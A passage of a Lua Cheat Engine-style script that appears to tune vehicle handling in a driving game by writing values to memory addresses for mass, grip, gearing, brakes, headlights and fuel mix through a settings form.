           WriteFloat(UpShiftADR,UpShiftCurrent)
        end
        if DownShift~=0 then
           DownShiftCurrent=DownShiftCurrent + DownShift
           WriteFloat(DownShiftADR,DownShiftCurrent)
        end
        if FWD~=0 then
           FWDCurrent=FWDCurrent + FWD
           WriteFloat(FWDADR,FWDCurrent)
        end
        if RWD~= 0 then
           RWDCurrent=RWDCurrent + RWD
           WriteFloat(RWDADR,RWDCurrent)
        end
        if Drive~=0 then
           InitialDriveForceCurrent=InitialDriveForceCurrent + Drive
           WriteFloat(InitialDriveForceADR,InitialDriveForceCurrent)
        end
        if MaxFlat~=0 then
           MaxFlatVelCurrent=MaxFlatVelCurrent + MaxFlat
           WriteFloat(MaxFlatVelADR,MaxFlatVelCurrent)
        end
        if InitMaxFat~=0 then
           InitialMaxFlatVelCurrent=InitialMaxFlatVelCurrent + InitMaxFlat
           WriteFloat(InitialMaxFlatVelADR,InitialMaxFlatVelCurrent)
        end
        if Brake~=0 then
           BrakeForceCurrent=BrakeForceCurrent + Brake
           WriteFloat(BrakeForceADR,BrakeForceCurrent)
        end
        if Steering~=0 then
           SteeringLockRatioCurrent=SteeringLockRatioCurrent + Steering
           WriteFloat(SteeringLockRatioADR,SteeringLockRatioCurrent)
        end
        if CurveMax~=0 then
           CurveMaxCurrent=CurveMaxCurrent + CurveMax
           WriteFloat(CurveMaxADR,CurveMaxCurrent)
        end
        if CurveMaxR~=0 then
           CurveMaxRatioCurrent=CurveMaxRatioCurrent + CurveMaxR
           WriteFloat(CurveMaxRatioADR,CurveMaxRatioCurrent)
        end
        if CurveMin~=0 then
           CurveMinCurrent=CurveMinCurrent + CurveMin
           WriteFloat(CurveMinADR,CurveMinCurrent)
        end
        if CurveMinR~=0 then
            CurveMinRatioCurrent=CurveMinRatioCurrent + CurveMinR
            WriteFloat(CurveMinRatioADR,CurveMinRatioCurrent)
        end
        if CurveLat~=0 then
           CurveLateralCurrent=CurveLateralCurrent + CurveLat
           WriteFloat(CurveLateralADR,CurveLateralCurrent)
        end
        if CurveLatR~=0 then
           CurveLateralRatioCurrent=CurveLateralRatioCurrent + CurveLatR
           WriteFloat(CurveLateralRatioADR,CurveLateralRatioCurrent)
        end
        if Coll~=0 then
           CollisionMultCurrent=CollisionMultCurrent + Coll
           WriteFloat(CollisionMultADR,CollisionMultCurrent)
        end
        if Eng~=0 then
           EngineMultCurrent=EngineMultCurrent + Eng
           WriteFloat(EngineMultADR,EngineMultCurrent)
        end
        if DF~=0 then
           DownForceMultCurrent=DownForceMultCurrent + DF
           WriteFloat(DownForceMultADR,DownForceMultCurrent)
        end
    end

    function ApplyGTEMod(IntoGTE,Mass,Drag,FWD,RWD,UpShift,DownShift,Drive,MaxFlat,InitMaxFlat,Brake,Steering,CurveMax,CurveMaxR,CurveMin,CurveMinR,CurveLat,CurveLatR,Coll,Eng,DF)
        if IntoGTE==false then
           Mass=Mass*(-1)
           Drag=Drag*(-1)
           FWD=FWD*(-1)
           RWD=RWD*(-1)
           UpShift=UpShift*(-1)
           DownShift=DownShift*(-1)
           Drive=Drive*(-1)
           MaxFlat=MaxFlat*(-1)
           InitMaxFlat=InitMaxFlat*(-1)
           Brake=Brake*(-1)
           Steering=Steering*(-1)
           CurveMax=CurveMax*(-1)
           CurveMaxR=CurveMaxR*(-1)
           CurveMin=CurveMin*(-1)
           CurveMinR=CurveMinR*(-1)
           CurveLat=CurveLat*(-1)
           CurveLatR=CurveLatR*(-1)
           Coll=Coll*(-1)
           Eng=Eng*(-1)
           DF=DF*(-1)
        end
        if Mass~=0 then
           MassCurrent=MassCurrent + Mass
           WriteFloat(MassADR,MassCurrent)
        end
        if Drag~=0 then
           DragCurrent=DragCurrent + Drag
           WriteFloat(DragADR,DragCurrent)
        end
        if UpShift~=0 then
           UpShiftCurrent=UpShiftCurrent + UpShift
           WriteFloat(UpShiftADR,UpShiftCurrent)
        end
        if DownShift~=0 then
           DownShiftCurrent=DownShiftCurrent + DownShift
           WriteFloat(DownShiftADR,DownShiftCurrent)
        end
        if FWD~=0 then
           FWDCurrent=FWDCurrent + FWD
           WriteFloat(FWDADR,FWDCurrent)
        end
        if RWD~= 0 then
           RWDCurrent=RWDCurrent + RWD
           WriteFloat(RWDADR,RWDCurrent)
        end
        if Drive~=0 then
           InitialDriveForceCurrent=InitialDriveForceCurrent + Drive
           WriteFloat(InitialDriveForceADR,InitialDriveForceCurrent)
        end
        if MaxFlat~=0 then
           MaxFlatVelCurrent=MaxFlatVelCurrent + MaxFlat
           WriteFloat(MaxFlatVelADR,MaxFlatVelCurrent)
        end
        if InitMaxFat~=0 then
           InitialMaxFlatVelCurrent=InitialMaxFlatVelCurrent + InitMaxFlat
           WriteFloat(InitialMaxFlatVelADR,InitialMaxFlatVelCurrent)
        end
        if Brake~=0 then
           BrakeForceCurrent=BrakeForceCurrent + Brake
           WriteFloat(BrakeForceADR,BrakeForceCurrent)
        end
        if Steering~=0 then
           SteeringLockRatioCurrent=SteeringLockRatioCurrent + Steering
           WriteFloat(SteeringLockRatioADR,SteeringLockRatioCurrent)
        end
        if CurveMax~=0 then
           CurveMaxCurrent=CurveMaxCurrent + CurveMax
           WriteFloat(CurveMaxADR,CurveMaxCurrent)
        end
        if CurveMaxR~=0 then
           CurveMaxRatioCurrent=CurveMaxRatioCurrent + CurveMaxR
           WriteFloat(CurveMaxRatioADR,CurveMaxRatioCurrent)
        end
        if CurveMin~=0 then
           CurveMinCurrent=CurveMinCurrent + CurveMin
           WriteFloat(CurveMinADR,CurveMinCurrent)
        end
        if CurveMinR~=0 then
            CurveMinRatioCurrent=CurveMinRatioCurrent + CurveMinR
            WriteFloat(CurveMinRatioADR,CurveMinRatioCurrent)
        end
        if CurveLat~=0 then
           CurveLateralCurrent=CurveLateralCurrent + CurveLat
           WriteFloat(CurveLateralADR,CurveLateralCurrent)
        end
        if CurveLatR~=0 then
           CurveLateralRatioCurrent=CurveLateralRatioCurrent + CurveLatR
           WriteFloat(CurveLateralRatioADR,CurveLateralRatioCurrent)
        end
        if Coll~=0 then
           CollisionMultCurrent=CollisionMultCurrent + Coll
           WriteFloat(CollisionMultADR,CollisionMultCurrent)
        end
        if Eng~=0 then
           EngineMultCurrent=EngineMultCurrent + Eng
           WriteFloat(EngineMultADR,EngineMultCurrent)
        end
        if DF~=0 then
           DownForceMultCurrent=DownForceMultCurrent + DF
           WriteFloat(DownForceMultADR,DownForceMultCurrent)
        end
    end

    function ApplyHSMod(IntoHS,Mass,Drag,FWD,RWD,UpShift,DownShift,Drive,MaxFlat,InitMaxFlat,Brake,Steering,CurveMax,CurveMaxR,CurveMin,CurveMinR,CurveLat,CurveLatR,Coll,Eng,DF,Flag,Front,Rear,Inertia,ADV,Model,SuspensionLift)
        if IntoHS==false then
           Mass=Mass*(-1)
           Drag=Drag*(-1)
           FWD=FWD*(-1)
           RWD=RWD*(-1)
           UpShift=UpShift*(-1)
           DownShift=DownShift*(-1)
           Drive=Drive*(-1)
           MaxFlat=MaxFlat*(-1)
           InitMaxFlat=InitMaxFlat*(-1)
           Brake=Brake*(-1)
           Steering=Steering*(-1)
           CurveMax=CurveMax*(-1)
           CurveMaxR=CurveMaxR*(-1)
           CurveMin=CurveMin*(-1)
           CurveMinR=CurveMinR*(-1)
           CurveLat=CurveLat*(-1)
           CurveLatR=CurveLatR*(-1)
           Coll=Coll*(-1)
           Eng=Eng*(-1)
           DF=DF*(-1)
           Flag=HandlingFlagDefault
           Front=Front*(-1)
           Rear=Rear*(-1)
           Inertia=Inertia*(-1)
           ADV=AdvancedDefault
           Model=ModelFlagDefault
           SuspensionLift=SuspensionLift*(-1)
        end
        if Mass~=0 then
           MassCurrent=MassCurrent + Mass
           WriteFloat(MassADR,MassCurrent)
        end
        if Drag~=0 then
           DragCurrent=DragCurrent + Drag
           WriteFloat(DragADR,DragCurrent)
        end
        if UpShift~=0 then
           UpShiftCurrent=UpShiftCurrent + UpShift
           WriteFloat(UpShiftADR,UpShiftCurrent)
        end
        if DownShift~=0 then
           DownShiftCurrent=DownShiftCurrent + DownShift
           WriteFloat(DownShiftADR,DownShiftCurrent)
        end
        if FWD~=0 then
           FWDCurrent=FWDCurrent + FWD
           WriteFloat(FWDADR,FWDCurrent)
        end
        if RWD~= 0 then
           RWDCurrent=RWDCurrent + RWD
           WriteFloat(RWDADR,RWDCurrent)
        end
        if Drive~=0 then
           InitialDriveForceCurrent=InitialDriveForceCurrent + Drive
           WriteFloat(InitialDriveForceADR,InitialDriveForceCurrent)
        end
        if MaxFlat~=0 then
           MaxFlatVelCurrent=MaxFlatVelCurrent + MaxFlat
           WriteFloat(MaxFlatVelADR,MaxFlatVelCurrent)
        end
        if InitMaxFat~=0 then
           InitialMaxFlatVelCurrent=InitialMaxFlatVelCurrent + InitMaxFlat
           WriteFloat(InitialMaxFlatVelADR,InitialMaxFlatVelCurrent)
        end
        if Brake~=0 then
           BrakeForceCurrent=BrakeForceCurrent + Brake
           WriteFloat(BrakeForceADR,BrakeForceCurrent)
        end
        if Steering~=0 then
           SteeringLockRatioCurrent=SteeringLockRatioCurrent + Steering
           WriteFloat(SteeringLockRatioADR,SteeringLockRatioCurrent)
        end
        if CurveMax~=0 then
           CurveMaxCurrent=CurveMaxCurrent + CurveMax
           WriteFloat(CurveMaxADR,CurveMaxCurrent)
        end
        if CurveMaxR~=0 then
           CurveMaxRatioCurrent=CurveMaxRatioCurrent + CurveMaxR
           WriteFloat(CurveMaxRatioADR,CurveMaxRatioCurrent)
        end
        if CurveMin~=0 then
           CurveMinCurrent=CurveMinCurrent + CurveMin
           WriteFloat(CurveMinADR,CurveMinCurrent)
        end
        if CurveMinR~=0 then
            CurveMinRatioCurrent=CurveMinRatioCurrent + CurveMinR
            WriteFloat(CurveMinRatioADR,CurveMinRatioCurrent)
        end
        if CurveLat~=0 then
           CurveLateralCurrent=CurveLateralCurrent + CurveLat
           WriteFloat(CurveLateralADR,CurveLateralCurrent)
        end
        if CurveLatR~=0 then
           CurveLateralRatioCurrent=CurveLateralRatioCurrent + CurveLatR
           WriteFloat(CurveLateralRatioADR,CurveLateralRatioCurrent)
        end
        if Coll~=0 then
           CollisionMultCurrent=CollisionMultCurrent + Coll
           WriteFloat(CollisionMultADR,CollisionMultCurrent)
        end
        if Eng~=0 then
           EngineMultCurrent=EngineMultCurrent + Eng
           WriteFloat(EngineMultADR,EngineMultCurrent)
        end
        if DF~=0 then
           DownForceMultCurrent=DownForceMultCurrent + DF
           WriteFloat(DownForceMultADR,DownForceMultCurrent)
        end
        if Flag~=0 then
           HandlingFlagCurrent=Flag
           writeBytes(HandlingFlagADR,HandlingFlagCurrent)
        end
        if Rear~=0 then
           RearGripCurrent=RearGripCurrent + Rear
           WriteFloat(RearGripADR,RearGripCurrent)
        end
        if Front~=0 then
           FrontGripCurrent=FrontGripCurrent + Front
           WriteFloat(FrontGripADR,FrontGripCurrent)
        end
        if Inertia~=0 then
           DriveInertiaCurrent=DriveInertiaCurrent + Inertia
           WriteFloat(DriveInertiaADR,DriveInertiaCurrent)
        end
        if ADV~=0 then
           AdvancedCurrent=ADV
           writeInteger(AdvancedADR,AdvancedCurrent)
        end
        if Model~=0 then
           ModelFlagCurrent=Model
           writeBytes(ModelFlagADR,ModelFlagCurrent)
        end
        if SuspensionLift~=0 then
           SuspensionRaiseCurrent=SuspensionRaiseCurrent+SuspensionLift
           UDF1.SuspensionRaiseValue.Caption = (((SuspensionRaiseCurrent*1000)//1)/10)+9
           writeFloat(SuspensionRaiseADR,SuspensionRaiseCurrent)
        end
    end

    function ApplyF1Mod(IntoF1,Mass,Drag,UpShift,DownShift,Drive,MaxFlat,InitMaxFlat,Brake,CurveMax,CurveMaxR,CurveMin,CurveMinR,CurveLat,CurveLatR,Front,Rear,Force,Bump,Travel,SuspensionLift,FS,RS,ARB,Rolo,DF)
        if IntoF1==false then
           Mass=Mass*(-1)
           Drag=Drag*(-1)
           UpShift=UpShift*(-1)
           DownShift=DownShift*(-1)
           Drive=Drive*(-1)
           MaxFlat=MaxFlat*(-1)
           InitMaxFlat=InitMaxFlat*(-1)
           Brake=Brake*(-1)
           CurveMax=CurveMax*(-1)
           CurveMaxR=CurveMaxR*(-1)
           CurveMin=CurveMin*(-1)
           CurveMinR=CurveMinR*(-1)
           CurveLat=CurveLat*(-1)
           DF=DF*(-1)
           Front=Front*(-1)
           Rear=Rear*(-1)
           SuspensionLift=SuspensionLift*(-1)
           Force=Force*(-1)
           Bump=Bump*(-1)
           Travel=Travel*(-1)
           FS=FS*(-1)
           RS=RS*(-1)
           ARB=ARB*(-1)
           Rolo=Rolo*(-1)
        end
        if Mass~=0 then
           MassCurrent=MassCurrent + Mass
           WriteFloat(MassADR,MassCurrent)
        end
        if Drag~=0 then
           DragCurrent=DragCurrent + Drag
           WriteFloat(DragADR,DragCurrent)
        end
        if UpShift~=0 then
           UpShiftCurrent=UpShiftCurrent + UpShift
           WriteFloat(UpShiftADR,UpShiftCurrent)
        end
        if DownShift~=0 then
           DownShiftCurrent=DownShiftCurrent + DownShift
           WriteFloat(DownShiftADR,DownShiftCurrent)
        end
        if Drive~=0 then
           InitialDriveForceCurrent=InitialDriveForceCurrent + Drive
           WriteFloat(InitialDriveForceADR,InitialDriveForceCurrent)
        end
        if MaxFlat~=0 then
           MaxFlatVelCurrent=MaxFlatVelCurrent + MaxFlat
           WriteFloat(MaxFlatVelADR,MaxFlatVelCurrent)
        end
        if InitMaxFat~=0 then
           InitialMaxFlatVelCurrent=InitialMaxFlatVelCurrent + InitMaxFlat
           WriteFloat(InitialMaxFlatVelADR,InitialMaxFlatVelCurrent)
        end
        if Brake~=0 then
           BrakeForceCurrent=BrakeForceCurrent + Brake
           WriteFloat(BrakeForceADR,BrakeForceCurrent)
        end
        if CurveMax~=0 then
           CurveMaxCurrent=CurveMaxCurrent + CurveMax
           WriteFloat(CurveMaxADR,CurveMaxCurrent)
        end
        if CurveMaxR~=0 then
           CurveMaxRatioCurrent=CurveMaxRatioCurrent + CurveMaxR
           WriteFloat(CurveMaxRatioADR,CurveMaxRatioCurrent)
        end
        if CurveMin~=0 then
           CurveMinCurrent=CurveMinCurrent + CurveMin
           WriteFloat(CurveMinADR,CurveMinCurrent)
        end
        if CurveMinR~=0 then
            CurveMinRatioCurrent=CurveMinRatioCurrent + CurveMinR
            WriteFloat(CurveMinRatioADR,CurveMinRatioCurrent)
        end
        if CurveLat~=0 then
           CurveLateralCurrent=CurveLateralCurrent + CurveLat
           WriteFloat(CurveLateralADR,CurveLateralCurrent)
        end
        if CurveLatR~=0 then
           CurveLateralRatioCurrent=CurveLateralRatioCurrent + CurveLatR
           WriteFloat(CurveLateralRatioADR,CurveLateralRatioCurrent)
        end
        if DF~=0 then
           DownForceMultCurrent=DownForceMultCurrent + DF
           WriteFloat(DownForceMultADR,DownForceMultCurrent)
        end
        if Rear~=0 then
           RearGripCurrent=RearGripCurrent + Rear
           WriteFloat(RearGripADR,RearGripCurrent)
        end
        if Front~=0 then
           FrontGripCurrent=FrontGripCurrent + Front
           WriteFloat(FrontGripADR,FrontGripCurrent)
        end
        if SuspensionLift~=0 then
           SuspensionRaiseCurrent=SuspensionRaiseCurrent+SuspensionLift
           UDF1.SuspensionRaiseValue.Caption = (((SuspensionRaiseCurrent*1000)//1)/10)+9
           writeFloat(SuspensionRaiseADR,SuspensionRaiseCurrent)
        end
        if Force~=0 then
           SuspensionForceCurrent=SuspensionForceCurrent + Force
           writeFloat(SuspensionForceADR,SuspensionForceCurrent)
        end
        if Bump~=0 then
           SuspensionBumpCurrent=SuspensionBumpCurrent + Bump
           writeFloat(SuspensionBumpADR,SuspensionBumpCurrent)
        end
        if Travel~=0 then
           SuspensionTravelCurrent=SuspensionTravelCurrent + Travel
           writeFloat(SuspensionTravelADR,SuspensionTravelCurrent)
        end
        if FS~=0 then
           FrontSpringCurrent=FrontSpringCurrent + FS
           writeFloat(FrontSpringADR,FrontSpringCurrent)
        end
        if RS~=0 then
           RearSpringCurrent=RearSpringCurrent + RS
           writeFloat(RearSpringADR,RearSpringCurrent)
        end
        if ARB~=0 then
           ARBForceCurrent=ARBForceCurrent + ARB
           writeFloat(ARBForceADR,ARBForceCurrent)
        end
        if Rolo~=0 then
           RoloRearCurrent=RoloRearCurrent + Rolo
           writeFloat(RoloRearADR,RoloRearCurrent)
        end
    end

    function MakeItGT3()
      GT3=true
      --MixCurrent = 0.000004
      load(GT3BOP)()
    end
    --ApplyGT3Mod(Mass,Drag,FWD,RWD,UpShift,DownShift,Drive,MaxFlat,InitMaxFlat,Brake,Steering,CurveMax,CurveMaxR,CurveMin,CurveMinR,CurveLat,CurveLatR,Coll,Eng,DF)
    function MakeItDefaultGT()
      GT3=false
      load(GT3BOP)()
    end

    function MakeItGTE()
     GTE=true
     load(GTEBOP)()
    end
    --ApplyGTEMod(GTEinfo,Mass,Drag,FWD,RWD,UpShift,DownShift,Drive,MaxFlat,InitMaxFlat,Brake,Steering,CurveMax,CurveMaxR,CurveMin,CurveMinR,CurveLat,CurveLatR,Coll,Eng,DF)
    function MakeItDefaultGTE()
     GTE=false
     load(GTEBOP)()
    end

    function MakeItHS()
     HS=true
     load(HSBOP)()
    end
    --ApplyHSMod(HSinfo,Mass,Drag,FWD,RWD,UpShift,DownShift,Drive,MaxFlat,InitMaxFlat,Brake,Steering,CurveMax,CurveMaxR,CurveMin,CurveMinR,CurveLat,CurveLatR,Coll,Eng,DF)
    function MakeItDefaultHS()
     HS=false
     load(HSBOP)()
    end
    --ApplyF1Mod(F1info,Mass,Drag,UpShift,DownShift,Drive,MaxFlat,InitMaxFlat,Brake,CurveMax,CurveMaxR,CurveMin,CurveMinR,CurveLat,CurveLatR,FrontGrip,RearGrip,SuspForce,Bump,Travel,Raise,SpringrateFront,SprintrateRear,ARB,RoloCentralAlturaRear,DF)
    function MakeItF1()
     F1=true
     load(F1BOP)()
    end
    function MakeItDefaultF1()
     F1=false
     load(F1BOP)()
    end
    --ApplyEvent
    function MakeItMeme()
    end
    function MakeItNotMeme()
    end
  end

  -- ADVANCED  ADVANCED  ADVANCED  ADVANCED  ADVANCED  ADVANCED  ADVANCED  ADVANCED
  function LoadAdvancedSettings()
    --BrakesSize
    function BrakesSizeIncrease()
     if BrakesSizeDELTA ~= 3 then
       BrakeForceCurrent = BrakeForceCurrent + 0.15
       DragCurrent = DragCurrent + 0.00005
       if BrakesSizeDELTA == 2 then
          UDF1.BrakesSizeValue.Caption = 'LARGE'
       end
       if BrakesSizeDELTA == 1 then
          UDF1.BrakesSizeValue.Caption = 'MEDIUM'
       end
       BrakesSizeDELTA = BrakesSizeDELTA + 1
       writeFloat(DragADR,DragCurrent)
       writeFloat(BrakeForceADR,BrakeForceCurrent)
       ChangedSetup=true
     end
    end

    function BrakesSizeDecrease()
     if BrakesSizeDELTA ~= 1 then
       BrakeForceCurrent = BrakeForceCurrent - 0.15
       DragCurrent = DragCurrent - 0.00005
       if BrakesSizeDELTA == 2 then
          UDF1.BrakesSizeValue.Caption = 'SMALL'
       end
       if BrakesSizeDELTA == 3 then
          UDF1.BrakesSizeValue.Caption = 'MEDIUM'
       end
       BrakesSizeDELTA = BrakesSizeDELTA - 1
       writeFloat(DragADR,DragCurrent)
       writeFloat(BrakeForceADR,BrakeForceCurrent)
       ChangedSetup=true
     end
    end

     --Brake Pressure
    function BrakePressureIncrease()
     if BrakePressureDELTA ~= 100 then
       BrakeBiasFrontCurrent = BrakeBiasFrontCurrent + 0.01
       BrakeBiasRearCurrent = BrakeBiasRearCurrent + 0.01
       BrakePressureDELTA = BrakePressureDELTA + 1
       UDF1.BrakePressureValue.Caption = BrakePressureDELTA.." %"
       writeFloat(BrakeBiasFrontADR,BrakeBiasFrontCurrent)
       writeFloat(BrakeBiasRearADR,BrakeBiasRearCurrent)
     end
    end

    function BrakePressureDecrease()
     if BrakePressureDELTA ~= 1 then
       BrakeBiasFrontCurrent = BrakeBiasFrontCurrent - 0.01
       BrakeBiasRearCurrent = BrakeBiasRearCurrent - 0.01
       BrakePressureDELTA = BrakePressureDELTA - 1
       UDF1.BrakePressureValue.Caption = BrakePressureDELTA.." %"
       writeFloat(BrakeBiasFrontADR,BrakeBiasFrontCurrent)
       writeFloat(BrakeBiasRearADR,BrakeBiasRearCurrent)
     end
    end

     --BrakeBias
    function BrakeBiasIncrease()
     if BrakeBiasDELTA ~= 17 then
       BrakeBiasFrontCurrent = BrakeBiasFrontCurrent + 0.025
       BrakeBiasRearCurrent = BrakeBiasRearCurrent - 0.025
       UDF1.BrakeBiasValue.Caption = ((((BrakeBiasFrontCurrent+0.001)*100/2)*100)//1)/100
       BrakeBiasDELTA = BrakeBiasDELTA + 1
       writeFloat(BrakeBiasFrontADR,BrakeBiasFrontCurrent)
       writeFloat(BrakeBiasRearADR,BrakeBiasRearCurrent)
     end
    end

    function BrakeBiasDecrease()
     if BrakeBiasDELTA ~= 1 then
       BrakeBiasRearCurrent = BrakeBiasRearCurrent + 0.025
       BrakeBiasFrontCurrent = BrakeBiasFrontCurrent - 0.025
       UDF1.BrakeBiasValue.Caption = ((((BrakeBiasFrontCurrent+0.001)*100/2)*100)//1)/100
       BrakeBiasDELTA = BrakeBiasDELTA - 1
       writeFloat(BrakeBiasFrontADR,BrakeBiasFrontCurrent)
       writeFloat(BrakeBiasRearADR,BrakeBiasRearCurrent)
     end
    end

    --Endurance Headlight
    function HeadlightIncrease()
     if HeadlightDELTA ~= 2 then
       HeadlightCurrent = 8
       UDF1.HeadlightValue.Caption = 'ON'
       HeadlightDELTA = HeadlightDELTA + 1
       writeFloat(HeadlightADR,HeadlightCurrent)
     end
    end

    function HeadlightDecrease()
     if HeadlightDELTA ~= 1 then
       HeadlightCurrent = 1
       UDF1.HeadlightValue.Caption = 'OFF'
       HeadlightDELTA = HeadlightDELTA - 1
       writeFloat(HeadlightADR,HeadlightCurrent)
     end
    end

    --XenonColor
    function XenonColorIncrease()
     if XenonColorDELTA ~= 4 then
       if XenonColorDELTA == 1 then
          XenonCurrent = 1
          XenonColorCurrent = -1
          UDF1.XenonColorValue.Caption = 'XENON'
       end
       if XenonColorDELTA == 2 then
          XenonCurrent = 1
          XenonColorCurrent = 6
          UDF1.XenonColorValue.Caption = 'GT'
       end
       if XenonColorDELTA == 3 then
          XenonCurrent = 1
          XenonColorCurrent = 2
          UDF1.XenonColorValue.Caption = 'PROTOTYPE'
       end
       XenonColorDELTA = XenonColorDELTA + 1
       writeBytes(XenonColorADR,XenonColorCurrent)
     end
    end

    function XenonColorDecrease()
     if XenonColorDELTA ~= 1 then
       if XenonColorDELTA == 2 then
          XenonCurrent = XenonDefault
          XenonColorCurrent = XenonColorDefault
          UDF1.XenonColorValue.Caption = 'DEFAULT'
       end
       if XenonColorDELTA == 3 then
          XenonCurrent = 1
          XenonColorCurrent = -1
          UDF1.XenonColorValue.Caption = 'XENON'
       end
       if XenonColorDELTA == 4 then
          XenonCurrent = 1
          XenonColorCurrent = 6
          UDF1.XenonColorValue.Caption = 'GT'
       end
       XenonColorDELTA = XenonColorDELTA - 1
       writeBytes(XenonColorADR,XenonColorCurrent)
     end
    end

    function ResetHeadlight()
     HeadlightADR = getAddress("[[PTR+8]+D30]+A14") --15
     XenonADR = getAddress("[[[PTR+8]+D30]+48]+3E1") --1
     XenonColorADR = getAddress("[[[PTR+8]+D30]+48]+406") --2 Proto 6 GT
     writeFloat(HeadlightADR,HeadlightCurrent)
     writeBytes(XenonADR,XenonCurrent)
     writeBytes(XenonColorADR,XenonColorCurrent)
    end

    --TC
    function TCIncrease()
     if TCDELTA ~= 9 then
       InitialDriveForceCurrent = InitialDriveForceCurrent - 0.005
       CurveMinRatioCurrent = CurveMinRatioCurrent + 0.1
       LowSpeedTractionCurrent = LowSpeedTractionCurrent - 0.095
       TCDELTA = TCDELTA + 1
       UDF1.TCValue.Caption=TCDELTA
       WriteFloat(InitialDriveForceADR,InitialDriveForceCurrent)
       WriteFloat(CurveMinRatioADR,CurveMinRatioCurrent)
       WriteFloat(LowSpeedTractionADR,LowSpeedTractionCurrent)
     end
    end

    function TCDecrease()
     if TCDELTA ~= 1 then
       InitialDriveForceCurrent = InitialDriveForceCurrent + 0.005
       CurveMinRatioCurrent = CurveMinRatioCurrent - 0.1
       LowSpeedTractionCurrent = LowSpeedTractionCurrent + 0.095
       TCDELTA = TCDELTA - 1
       UDF1.TCValue.Caption=TCDELTA
       WriteFloat(InitialDriveForceADR,InitialDriveForceCurrent)
       WriteFloat(CurveMinRatioADR,CurveMinRatioCurrent)
       WriteFloat(LowSpeedTractionADR,LowSpeedTractionCurrent)
     end
    end

    function TPIncrease()
     if TPDELTA ~= 180 then
       TPDELTA=TPDELTA + 5
       UDF1.TirePressureValue.Caption = TPDELTA
       FrontGripCurrent = FrontGripCurrent - 0.0075
       RearGripCurrent = RearGripCurrent - 0.0075
       MaxFlatVelCurrent = MaxFlatVelCurrent + 0.02
       writeFloat(MaxFlatVelADR,MaxFlatVelCurrent)
       writeFloat(FrontGripADR,FrontGripCurrent)
       writeFloat(RearGripADR,RearGripCurrent)
       ChangedSetup=true
     end
    end

    function TPDecrease()
     if TPDELTA ~= 140 then
       TPDELTA=TPDELTA - 5
       UDF1.TirePressureValue.Caption = TPDELTA
       FrontGripCurrent = FrontGripCurrent + 0.0075
       RearGripCurrent = RearGripCurrent + 0.0075
       MaxFlatVelCurrent = MaxFlatVelCurrent - 0.02
       writeFloat(MaxFlatVelADR,MaxFlatVelCurrent)
       writeFloat(FrontGripADR,FrontGripCurrent)
       writeFloat(RearGripADR,RearGripCurrent)
       ChangedSetup=true
     end
    end

    function CarStatusCFON()
     if CarStatusDELTA ~= 2 then
       CarStatusDELTA=2
       UDF1.CfSValue.Caption = "ON"
       CarStatus=true
     end
    end

    function CarStatusCFOFF()
     if CarStatusDELTA ~= 1 then
       CarStatusDELTA=1
       UDF1.CfSValue.Caption = "OFF"
       CarStatus=false
     end
    end

    function SpotterCFON()
     if SpotterDELTA ~= 2 then
       SpotterDELTA=2
       UDF1.CfSpotValue.Caption = "ON"
       Spotter=true
     end
    end

    function SpotterCFOFF()
     if SpotterDELTA ~= 1 then
       SpotterDELTA=1
       UDF1.CfSpotValue.Caption = "OFF"
       Spotter=false
     end
    end
  end

  --ENGINE ENGINE ENGINE ENGINE ENGINE ENGINE ENGINE ENGINE ENGINE ENGINE ENGINE ENGINE
  function LoadEngineSettings()
    --Gears
    UDF1.FuelValue.OnClick = SetFuel()
    function GearsIncrease()
     if GearsDELTA ~= 2 then
        DriveInertiaCurrent = DriveInertiaCurrent + 0.8
        UpShiftCurrent = UpShiftCurrent + 5.6
        DownShiftCurrent = DownShiftCurrent + 5.6
        MaxFlatVelCurrent = MaxFlatVelCurrent - 3.5
        InitialMaxFlatVelCurrent = InitialMaxFlatVelCurrent - 5
       GearsDELTA = GearsDELTA + 1
       if GearsDELTA==2 then
          UDF1.GearsValue.Caption = 'Short'
       end
       WriteFloat(DriveInertiaADR,DriveInertiaCurrent)
       WriteFloat(UpShiftADR,UpShiftCurrent)
       WriteFloat(DownShiftADR,DownShiftCurrent)
       WriteFloat(MaxFlatVelADR,MaxFlatVelCurrent)
       WriteFloat(InitialMaxFlatVelADR,InitialMaxFlatVelCurrent)
       ChangedSetup=true
     end
    end

    function GearsDecrease()
     if GearsDELTA ~= 1 then
        DriveInertiaCurrent = DriveInertiaCurrent - 0.8
        UpShiftCurrent = UpShiftCurrent - 5.6
        DownShiftCurrent = DownShiftCurrent - 5.6
        MaxFlatVelCurrent = MaxFlatVelCurrent + 3.5
        InitialMaxFlatVelCurrent = InitialMaxFlatVelCurrent + 5
       GearsDELTA = GearsDELTA - 1
       if GearsDELTA==1 then
          UDF1.GearsValue.Caption = 'Standart'
       end
       WriteFloat(DriveInertiaADR,DriveInertiaCurrent)
       WriteFloat(UpShiftADR,UpShiftCurrent)
       WriteFloat(DownShiftADR,DownShiftCurrent)
       WriteFloat(MaxFlatVelADR,MaxFlatVelCurrent)
       WriteFloat(InitialMaxFlatVelADR,InitialMaxFlatVelCurrent)
       ChangedSetup=true
     end
    end

    function SetFuel()
      if FuelSystemEnabled==true then
        local level = inputQuery('SET FUEL LEVEL | FUEL TANK CAPACITY = '..CurrentCarMaxFuel)
        if level ~= nil then
            if level < 1 then
              FuelDELTA = 1
              UDF1.FuelValue.Caption = (FuelDELTA.."L")
            elseif level > CurrentCarMaxFuel then
              FuelDELTA = CurrentCarMaxFuel
              UDF1.FuelValue.Caption = (FuelDELTA.."L")
            else
              FuelDELTA = level
              UDF1.FuelValue.Caption = (FuelDELTA.."L")
            end
      end
    end

    function FuelIncrease()
     if FuelSystemEnabled==true then
      if FuelDELTA ~= CurrentCarMaxFuel then
         FuelDELTA=FuelDELTA + 1
         UDF1.FuelValue.Caption = (FuelDELTA.."L")
      end
     end
    end

    function FuelDecrease()
     if FuelSystemEnabled==true then
      if FuelDELTA ~= 1 then
         FuelDELTA=FuelDELTA - 1
         UDF1.FuelValue.Caption = (FuelDELTA.."L")
      end
     end
    end

    function MixIncrease()
     if FuelSystemEnabled==true then
      if MixDELTA ~= 4 and EngRunDELTA ~= 0 then
         MixCurrent = MixCurrent + 0.0000009
         MixDELTA = MixDELTA + 1
         RWDCurrent = RWDCurrent + 0.11
         writeFloat(RWDADR,RWDCurrent)
         speak(MixDELTA)
         UDF1.MixValue.Caption = MixDELTA
         UDF1.MixValueDisp.Caption = MixDELTA
      end
     end
    end

    function MixDecrease()
     if FuelSystemEnabled==true then
      if MixDELTA ~= 1 and EngRunDELTA ~= 0 then
         MixCurrent = MixCurrent - 0.0000009
         MixDELTA = MixDELTA - 1
         RWDCurrent = RWDCurrent - 0.11
         writeFloat(RWDADR,RWDCurrent)
